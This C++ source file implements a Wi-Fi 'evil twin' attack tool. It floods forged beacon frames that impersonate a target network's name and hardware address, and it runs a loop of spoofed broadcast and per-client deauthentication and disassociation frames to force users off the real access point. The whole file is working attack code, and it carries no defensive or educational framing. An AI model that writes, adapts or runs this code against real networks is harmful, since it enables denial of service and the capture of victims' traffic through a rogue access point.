#include "eviltwin_cpp_v1.h"
#include <cstdio>
#include <cstring>
#include <ctime>
#include <unistd.h>
#include <sys/socket.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <linux/if_packet.h>
#include <linux/wireless.h>
#include <netinet/in.h>
#include <net/ethernet.h>
#include <sys/uio.h>

#undef ifr_name

EviltwinBeaconV1::EviltwinBeaconV1(const std::string& iface, const std::string& ssid,
                                   const std::string& bssid, uint8_t channel)
    : iface_(iface), ssid_(ssid), channel_(channel) {
    unsigned int b[6];
    if (std::sscanf(bssid.c_str(), "%02x:%02x:%02x:%02x:%02x:%02x",
                    &b[0], &b[1], &b[2], &b[3], &b[4], &b[5]) == 6)
        for (int i = 0; i < 6; i++) bssid_[i] = (uint8_t)b[i];
    else
        std::memset(bssid_, 0, 6);
}

EviltwinBeaconV1::~EviltwinBeaconV1() { stop(); }

void EviltwinBeaconV1::set_real_bssid(const std::string& bssid) {
    unsigned int b[6];
    if (std::sscanf(bssid.c_str(), "%02x:%02x:%02x:%02x:%02x:%02x",
                    &b[0], &b[1], &b[2], &b[3], &b[4], &b[5]) == 6) {
        for (int i = 0; i < 6; i++) real_bssid_[i] = (uint8_t)b[i];
        real_bssid_set_ = true;

        /* Pre-build deauth/disassoc frames */
        uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
        build_deauth_frame(deauth_frame_, 0xC0, real_bssid_, broadcast);
        deauth_frame_len_ = 64;
        build_deauth_frame(disassoc_frame_, 0xA0, real_bssid_, broadcast);
        disassoc_frame_len_ = 64;
        build_deauth_frame(deauth_client_frame_, 0xC0, real_bssid_, broadcast);
        deauth_client_frame_len_ = 64;
    }
}

void EviltwinBeaconV1::build_deauth_frame(uint8_t* buf, uint8_t frame_type,
                                          const uint8_t* bssid, const uint8_t* station) {
    std::memset(buf, 0, 64);
    int off = 12;
    buf[off++] = frame_type; buf[off++] = 0x00;
    buf[off++] = 0x3A; buf[off++] = 0x01;
    std::memcpy(buf + off, station, 6); off += 6;
    std::memcpy(buf + off, bssid, 6); off += 6;
    std::memcpy(buf + off, bssid, 6); off += 6;
    buf[off++] = 0x00; buf[off++] = 0x00;
    buf[off++] = 0x03; buf[off++] = 0x00;
}

int EviltwinBeaconV1::open_socket() {
    struct sockaddr_ll sll;
    int fd = ::socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (fd < 0) return -1;
    struct ifreq ifr;
    std::memset(&ifr, 0, sizeof(ifr));
    std::strncpy(ifr.ifr_ifrn.ifrn_name, iface_.c_str(), IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0) { ::close(fd); return -1; }
    std::memset(&sll, 0, sizeof(sll));
    sll.sll_family = AF_PACKET;
    sll.sll_ifindex = ifr.ifr_ifindex;
    sll.sll_protocol = htons(ETH_P_ALL);
    if (::bind(fd, (struct sockaddr*)&sll, sizeof(sll)) < 0) { ::close(fd); return -1; }
    return fd;
}

void EviltwinBeaconV1::set_channel(int ch) {
    int fd = ::socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return;
    struct iwreq wr;
    std::memset(&wr, 0, sizeof(wr));
    std::strncpy(wr.ifr_ifrn.ifrn_name, iface_.c_str(), IFNAMSIZ - 1);
    wr.u.freq.m = 2407 + ch * 5;
    wr.u.freq.e = 6;
    ioctl(fd, SIOCSIWFREQ, &wr);
    ::close(fd);
}

void EviltwinBeaconV1::start() {
    if (running_.exchange(true)) return;
    beacon_worker_ = std::thread(&EviltwinBeaconV1::beacon_loop, this);
    beacon_worker_.detach();
}

void EviltwinBeaconV1::stop() {
    running_ = false;
    deauth_running_ = false;
    if (beacon_worker_.joinable()) beacon_worker_.join();
    if (deauth_worker_.joinable()) deauth_worker_.join();
}

void EviltwinBeaconV1::start_deauth() {
    if (!real_bssid_set_ || deauth_running_.exchange(true)) return;
    deauth_worker_ = std::thread(&EviltwinBeaconV1::deauth_loop, this);
    deauth_worker_.detach();
}

void EviltwinBeaconV1::stop_deauth() {
    deauth_running_ = false;
    if (deauth_worker_.joinable()) deauth_worker_.join();
}

std::vector<std::string> EviltwinBeaconV1::get_clients() const {
    pthread_mutex_lock(&clients_lock_);
    auto result = detected_clients_;
    pthread_mutex_unlock(&clients_lock_);
    return result;
}

void EviltwinBeaconV1::beacon_loop() {
    int fd = open_socket();
    if (fd < 0) { running_ = false; return; }
    set_channel(channel_);

    int ssid_len = (int)ssid_.size();
    if (ssid_len > 32) ssid_len = 32;
    const int batch = 64;
    struct mmsghdr msgs[batch];
    struct iovec iovs[batch];
    uint8_t frame_buf[batch][128];
    struct sockaddr_ll dest;
    std::memset(&dest, 0, sizeof(dest));
    dest.sll_family = AF_PACKET;

    while (running_) {
        int n = 0;
        for (int i = 0; i < batch && running_; i++) {
            uint8_t* f = frame_buf[n];
            std::memset(f, 0, 128);
            uint16_t fc = 0x0080;
            std::memcpy(f, &fc, 2);
            std::memset(f + 4, 0xFF, 6);
            std::memcpy(f + 10, bssid_, 6);
            std::memcpy(f + 16, bssid_, 6);
            f[22] = (uint8_t)((seq_ & 0x0F) << 4);
            f[23] = (uint8_t)((seq_ >> 4) & 0xFF);
            seq_ = (seq_ + 1) & 0xFFF;
            int off = 24;
            uint64_t ts = (uint64_t)(std::time(nullptr) * 1000000ULL);
            std::memcpy(f + off, &ts, 8); off += 8;
            uint16_t bi = 100;
            std::memcpy(f + off, &bi, 2); off += 2;
            uint16_t caps = 0x0431;
            std::memcpy(f + off, &caps, 2); off += 2;
            f[off++] = 0; f[off++] = (uint8_t)ssid_len;
            std::memcpy(f + off, ssid_.c_str(), (size_t)ssid_len); off += ssid_len;
            f[off++] = 1; f[off++] = 8;
            uint8_t rates[] = {0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24};
            std::memcpy(f + off, rates, 8); off += 8;
            f[off++] = 3; f[off++] = 1; f[off++] = channel_;

            iovs[n].iov_base = f;
            iovs[n].iov_len = (size_t)off;
            std::memset(&msgs[n], 0, sizeof(msgs[n]));
            msgs[n].msg_hdr.msg_iov = &iovs[n];
            msgs[n].msg_hdr.msg_iovlen = 1;
            msgs[n].msg_hdr.msg_name = &dest;
            msgs[n].msg_hdr.msg_namelen = sizeof(dest);
            n++;
        }
        int ret = (int)::sendmmsg(fd, msgs, (unsigned int)n, 0);
        if (ret > 0) sent_ += (uint64_t)ret;
    }
    ::close(fd);
}

void EviltwinBeaconV1::deauth_loop() {
    int fd = open_socket();
    if (fd < 0) { deauth_running_ = false; return; }
    set_channel(channel_);
    uint8_t client_mac[6];
    uint8_t frame[64];
    long total = 0;

    while (deauth_running_) {
        /* Broadcast deauth + disassoc alternating */
        ::send(fd, deauth_frame_, deauth_frame_len_, 0); total++;
        ::send(fd, disassoc_frame_, disassoc_frame_len_, 0); total++;

        /* Targeted to detected clients */
        pthread_mutex_lock(&clients_lock_);
        if (!detected_clients_.empty()) {
            int idx = (int)(total % detected_clients_.size());
            const auto& mac = detected_clients_[idx];
            unsigned int b[6];
            if (std::sscanf(mac.c_str(), "%02x:%02x:%02x:%02x:%02x:%02x",
                           &b[0], &b[1], &b[2], &b[3], &b[4], &b[5]) == 6) {
                for (int i = 0; i < 6; i++) client_mac[i] = (uint8_t)b[i];
                /* AP → client */
                build_deauth_frame(frame, 0xC0, real_bssid_, client_mac);
                ::send(fd, frame, 64, 0); total++;
                /* Client → AP */
                build_deauth_frame(frame, 0xC0, client_mac, real_bssid_);
                ::send(fd, frame, 64, 0); total++;
            }
        }
        pthread_mutex_unlock(&clients_lock_);
    }
    deauth_sent_ = (uint64_t)total;
    ::close(fd);
}
